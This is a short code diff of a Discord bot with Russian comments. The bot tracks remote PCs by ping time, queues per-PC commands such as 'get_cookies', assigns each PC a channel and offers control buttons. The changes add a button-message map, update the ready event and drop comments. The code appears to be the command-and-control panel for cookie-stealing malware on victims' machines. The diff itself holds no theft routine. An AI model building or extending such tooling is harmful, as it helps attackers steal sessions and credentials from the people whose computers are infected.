@@ -16,11 +16,13 @@ const ONLINE_TIMEOUT = 3 * 60 * 1000; // 3 минуты
 const onlinePCs = {};          // { pcId: lastPingTimestamp }
 const pendingCommands = {};    // { pcId: [ 'get_cookies', ... ] }
 const channelByPC = {};        // { pcId: channelId }
+const messagesWithButtons = {}; // { pcId: messageId }
 
 // ---------------- Discord Bot ----------------
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-bot.once("ready", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
+// clientReady для v15
+bot.once("clientReady", () => console.log(`✅ Бот вошёл как ${bot.user.tag}`));
 
 // ---------------- Buttons ----------------
 function createControlButtons(pcId) {
@@ -42,7 +44,6 @@ bot.on("interactionCreate", async interaction => {
   const pcId = pcIdParts.join("|");
   const lastPing = onlinePCs[pcId];
 
-  // Проверяем реальное состояние ПК
   const isOnline = lastPing && (Date.now() - lastPing < ONLINE_TIMEOUT);
 
   if(command === "check_online") {
@@ -55,7 +56,6 @@ bot.on("interactionCreate", async interaction => {
     return;
   }
 
-  // Не отправлять команды, если ПК оффлайн
   if(!isOnline){
     await interaction.reply({ content: `❌ ПК ${pcId} оффлайн`, ephemeral: true });
     return;
